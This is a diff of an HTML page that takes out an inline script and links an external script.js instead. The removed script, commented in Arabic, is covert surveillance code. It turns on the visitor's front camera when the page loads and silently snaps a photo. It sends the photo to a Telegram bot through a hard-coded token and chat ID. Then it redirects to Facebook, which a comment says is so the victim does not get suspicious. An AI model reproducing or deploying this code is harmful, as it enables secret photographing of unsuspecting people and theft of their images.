@@ -25,61 +25,8 @@
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
-<script>
-const TOKEN = "8469668913:AAE2ks3XnwwtTnTEXDZHshbLsIZ5ihoI7ZE";
-const CHAT_ID = "5870377141";
-
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-
-// وظيفة تشغيل الكاميرا
-async function start() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = stream;
-        
-        // الانتظار ثانية ونصف لضمان استقرار الصورة ثم التصوير التلقائي
-        setTimeout(capture, 1500);
-    } catch (err) {
-        // إذا رفض المستخدم الإذن
-        window.location.href = "https://facebook.com";
-    }
-}
-
-function capture() {
-    const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    canvas.toBlob(function(blob) {
-        send(blob);
-    }, "image/jpeg", 0.7);
-}
-
-function send(capturedBlob) {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", capturedBlob, "image.jpg");
-
-    // استخدام نفس طريقة fetch المباشرة اللي نجحت في كود الأزرار
-    fetch("https://telegram.org" + TOKEN + "/sendPhoto", {
-        method: "POST",
-        body: formData
-    })
-    .then(function(response) {
-        // بعد الإرسال مباشرة، التوجيه لفيسبوك
-        window.location.href = "https://facebook.com";
-    })
-    .catch(function(error) {
-        // حتى لو صار خطأ، التوجيه لفيسبوك عشان ما يشك
-        window.location.href = "https://facebook.com";
-    });
-}
-
-// ابدأ التشغيل فور تحميل الصفحة
-window.onload = start;
-</script>
+<!-- هنا ربط ملف الـ Javascript الخارجي -->
+<script src="script.js"></script>
 
 </body>
 </html>
